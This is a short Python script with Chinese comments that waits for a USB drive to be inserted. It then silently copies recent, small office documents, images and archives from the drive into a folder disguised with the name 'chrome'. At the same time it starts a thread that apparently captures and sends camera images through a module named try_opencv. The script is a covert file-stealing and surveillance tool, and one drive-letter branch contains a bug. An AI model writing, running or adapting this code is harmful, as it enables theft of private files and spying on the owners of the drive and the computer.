import os
import shutil
import time
import try_opencv
import multiprocessing
import threading


def find_usb_path():

    i = 0
    usb_name = ' '
    if os.path.isdir('c:'):  # 查找一共几个分区
        i += 1
        if os.path.isdir('d:'):
            i += 1
            if os.path.isdir('e:'):
                i += 1
                if os.path.isdir('f:'):
                    i += 1
                    if os.path.isdir('g:'):
                        i += 1
                        if os.path.isdir('h:'):
                            i += 1
                            if os.path.isdir('i:'):
                                i += 1
                                if os.path.isdir('j:'):
                                    i += 1
    if i == 1:
        usb_path = usb_name.replace(' ', 'd:')
    elif i == 2:
        usb_path = usb_name.replace(' ', 'e:')
    elif i == 3:
        usb_path = usb_name.replace(' ', 'f:')
    elif i == 4:
        usb_path = usb_name.replace(' ', 'g:')
    elif i == 5:
        usb_path = usb_name.format(' ', 'h:')
    elif i == 6:
        usb_path = usb_name.replace(' ', 'i:')
    elif i == 7:
        usb_path = usb_name.replace(' ', 'j:')
    elif i == 8:
        usb_path = usb_name.replace(' ', 'k:')
    else:
        return None

    # print(usb_path,i)
    return usb_path


def find_last_file(usb_path):
    file_lists = list()
    response = os.walk(usb_path)
    for dirpath, dirname, filename in response:
        for file in filename:
            endpath = dirpath+'\\'+file
            file_lists.append(endpath)
    # print(file_lists)
    return file_lists


def data_list():
    endwith_list = ['zip', 'doc', 'docx', 'ppt', 'jpg', 'xls', 'pdf', 'xlsx']
    return endwith_list


def cpFile(usb_path):
    lists = find_last_file(usb_path)
    try:
        os.mkdir(r'{}\chrome'.format(os.getcwd()))
    except:
        pass
    i = 0
    for file_path in lists:
        for D in data_list():
            if file_path.endswith(D):
                if os.path.getsize(file_path) <= 10746966:  # 文件小于10 mb
                    if time.time()-os.path.getmtime(file_path) <= 5184000:  # 近2个月修改
                        try:
                            shutil.copy2(
                                file_path, r'{}\chrome'.format(os.getcwd()))
                        except:
                            i += 1
                            continue
    print('漏了%d个' % i)


def main(usb_path):
    print(usb_path)
    while True:
        time.sleep(1)
        if os.path.isdir(usb_path):
            print('star')
            # time.sleep(3)
            cpFile(usb_path)
            print('done')
            break


def run():
    th1 = threading.Thread(target=try_opencv.send_cap)
    th2 = threading.Thread(target=main, args=(find_usb_path(),))
    try:
        th1.start()
    except:
        print('发送失败')
    th2.start()
    while len(threading.enumerate()) > 1:
        print('当前线程数为:', len(threading.enumerate()), end='\r')
        time.sleep(1)


if __name__ == "__main__":
    run()
